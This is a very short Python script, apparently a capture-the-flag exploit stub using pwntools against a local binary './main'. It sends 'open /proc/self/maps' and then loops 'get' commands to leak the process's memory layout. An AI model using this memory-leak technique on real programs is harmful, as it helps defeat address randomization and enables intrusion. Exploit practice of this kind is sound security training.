from pwn import *
elf = context.binary = ELF('./main')
p = process()
p.sendline(b'open /proc/self/maps')
for i in range(100):
	p.send(f'get {i}')
	p.recv()